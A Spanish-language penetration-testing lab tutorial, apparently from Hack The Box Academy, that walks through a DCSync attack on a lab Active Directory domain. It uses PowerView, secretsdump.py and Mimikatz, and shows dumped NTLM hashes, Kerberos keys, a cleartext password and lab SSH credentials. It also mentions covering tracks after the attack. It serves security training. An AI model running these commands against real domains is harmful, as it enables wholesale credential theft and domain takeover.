Basado en nuestro trabajo en la sección anterior, ahora tenemos control sobre el usuario `adunn`, quien tiene privilegios DCSync en el dominio INLANEFREIGHT.LOCAL. Vamos a profundizar en este ataque y repasar ejemplos de cómo aprovecharlo para comprometer el dominio completo desde un host de ataque tanto Linux como Windows.

---

## Scenario Setup

En esta sección, nos moveremos entre un host de ataque Windows y Linux mientras trabajamos en los diversos ejemplos. Puedes iniciar los hosts para esta sección al final de esta sección y RDP en el host de ataque MS01 Windows. Para la parte de esta sección que requiere interacción desde un host Linux (secretsdump.py), puedes abrir una consola de PowerShell en MS01 y hacer SSH a `172.16.5.225` con las credenciales `htb-student:HTB_@cademy_stdnt!`. Esto también podría hacerse todo desde Windows usando una versión de `secretsdump.exe` compilada para Windows, ya que hay varios repositorios de GitHub del toolkit Impacket compilados para Windows, o puedes hacerlo como un desafío adicional.

---

## What is DCSync and How Does it Work?

DCSync es una técnica para robar la base de datos de contraseñas de Active Directory utilizando el `Directory Replication Service Remote Protocol` incorporado, que es utilizado por los Domain Controllers para replicar datos de dominio. Esto permite a un atacante imitar un Domain Controller para recuperar los hashes de contraseña NTLM de los usuarios.

El núcleo del ataque es solicitar a un Domain Controller que replique contraseñas a través del derecho extendido `DS-Replication-Get-Changes-All`. Este es un derecho de control de acceso extendido dentro de AD, que permite la replicación de datos secretos.

Para realizar este ataque, debes tener control sobre una cuenta que tenga los derechos para realizar la replicación de dominio (un usuario con los permisos Replicating Directory Changes y Replicating Directory Changes All establecidos). Los Domain/Enterprise Admins y los administradores de dominio predeterminados tienen este derecho por defecto.

### Viewing adunn's Replication Privileges through ADSI Edit

![image](https://academy.hackthebox.com/storage/modules/143/adnunn_right_dcsync.png)

Es común durante una evaluación encontrar otras cuentas que tienen estos derechos, y una vez comprometidas, su acceso puede ser utilizado para recuperar el hash de contraseña NTLM actual para cualquier usuario de dominio y los hashes correspondientes a sus contraseñas anteriores. Aquí tenemos un usuario de dominio estándar al que se le han otorgado los permisos de replicación:

### Using Get-DomainUser to View adunn's Group Membership

```r
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl


samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

PowerView puede ser usado para confirmar que este usuario estándar tiene de hecho los permisos necesarios asignados a su cuenta. Primero obtenemos el SID del usuario en el comando anterior y luego verificamos todos los ACLs establecidos en el objeto de dominio (`"DC=inlanefreight,DC=local"`) usando [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) para obtener los ACLs asociados con el objeto. Aquí buscamos específicamente derechos de replicación y verificamos si nuestro usuario `adunn` (denotado en el comando a continuación como `$sid`) posee estos derechos. El comando confirma que el usuario de hecho tiene los derechos.

### Using Get-ObjectAcl to Check adunn's Replication Rights

```r
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

Si tuviéramos ciertos derechos sobre el usuario (como [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), también podríamos agregar este privilegio a un usuario bajo nuestro control, ejecutar el ataque DCSync y luego eliminar los privilegios para intentar cubrir nuestros rastros. La replicación DCSync puede ser realizada usando herramientas como Mimikatz, Invoke-DCSync y secretsdump.py de Impacket. Veamos algunos ejemplos rápidos.

Ejecutar la herramienta como a continuación escribirá todos los hashes en archivos con el prefijo `inlanefreight_hashes`. La flag `-just-dc` le dice a la herramienta que extraiga hashes NTLM y claves Kerberos del archivo NTDS.

### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

```r
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

d0wngrade:des-cbc-md5:d6fee0b62aa410fe
d0wngrade:dec-cbc-crc:d6fee0b62aa410fe
ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
svc_qualys:des-cbc-md5:f125ab34b53eb61c
forend:des-cbc-md5:e3c14adf9d8a04c1
[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

Podemos usar la flag `-just-dc-ntlm` si solo queremos hashes NTLM o especificar `-just-dc-user <USERNAME>` para solo extraer datos de un usuario específico. Otras opciones útiles incluyen `-pwd-last-set` para ver cuándo fue la última vez que se cambió la contraseña de cada cuenta y `-history` si queremos volcar el historial de contraseñas, lo que puede ser útil para el descifrado de contraseñas offline o como datos complementarios sobre las métricas de fortaleza de las contraseñas del dominio para nuestro cliente. La flag `-user-status` es otra opción útil para verificar si un usuario está deshabilitado. Podemos volcar los datos de NTDS con esta flag y luego filtrar a los usuarios deshabilitados al proporcionar a nuestro cliente estadísticas de descifrado de contraseñas para asegurarnos de que datos como:

- Número y % de contraseñas descifradas
- Las 10 contraseñas principales
- Métricas de longitud de contraseña
- Reutilización de contraseñas

reflejen solo cuentas de usuario activas en el dominio.

Si verificamos los archivos creados usando la flag `-just-dc`, veremos que hay tres: uno que contiene los hashes NTLM, uno que contiene claves Kerberos y uno que contendría contraseñas en texto claro del NTDS para cualquier cuenta configurada con [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitada.

### Listing Hashes, Kerberos Keys, and Cleartext Passwords

```r
ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

Aunque raro, vemos cuentas con estas configuraciones de vez en cuando. Normalmente se configuraría para proporcionar soporte a aplicaciones que usan ciertos protocolos que requieren que la contraseña de un usuario se use para fines de autenticación.

### Viewing an Account with Reversible Encryption Password Storage Set

![image](https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)

Cuando esta opción está configurada en una cuenta de usuario, no significa que las contraseñas se almacenen en texto claro. En su lugar, se almacenan usando cifrado RC4. El truco aquí es que la clave necesaria para descifrarlas se almacena en el registro (el [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) y puede ser extraída por un Domain Admin o equivalente. Herramientas como `secretsdump.py` descifrarán cualquier contraseña almacenada usando cifrado reversible mientras se vuelca el archivo NTDS ya sea como un Domain Admin o usando un ataque como DCSync. Si esta configuración está deshabilitada en una cuenta, un usuario necesitará cambiar su contraseña para que se almacene usando cifrado unidireccional. Cualquier contraseña establecida en cuentas con esta configuración habilitada se almacenará usando cifrado reversible hasta que se cambien. Podemos enumerar esto usando el cmdlet `Get-ADUser`:

### Enumerating Further using Get-ADUser

```r
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

Podemos ver que una cuenta, `proxyagent`, tiene la opción de cifrado reversible configurada también con PowerView:

### Checking for Reversible Encryption Option using Get-DomainUser

```r
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

Notaremos que la herramienta descifró la contraseña y nos proporcionó el valor en texto claro.

### Displaying the Decrypted Password

```r
cat inlanefreight_hashes.ntds.cleartext 

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

He estado en algunos compromisos donde todas las cuentas de usuario se almacenaban usando cifrado reversible. Algunos clientes pueden hacer esto para poder volcar NTDS y realizar auditorías periódicas de fortaleza de contraseñas sin tener que recurrir al descifrado de contraseñas offline.

Podemos realizar el ataque con Mimikatz también. Usando Mimikatz, debemos apuntar a un usuario específico. Aquí apuntaremos a la cuenta de administrador incorporada. También podríamos apuntar a la cuenta `krbtgt` y usar esto para crear un `Golden Ticket` para persistencia, pero eso está fuera del alcance de este módulo.

También es importante notar que Mimikatz debe ser ejecutado en el contexto del usuario que tiene privilegios DCSync. Podemos utilizar `runas.exe` para lograr esto:

### Using runas.exe

```r
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

Desde la sesión de PowerShell recién abierta, podemos realizar el ataque:

### Performing the Attack with Mimikatz

```r
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```

---

## Moving On

En la siguiente sección, veremos algunas formas de enumerar y aprovechar los derechos de acceso remoto que pueden ser otorgados a un usuario que controlamos. Estos métodos incluyen Remote Desktop Protocol (RDP), WinRM (o PsRemoting) y acceso de administrador de SQL Server.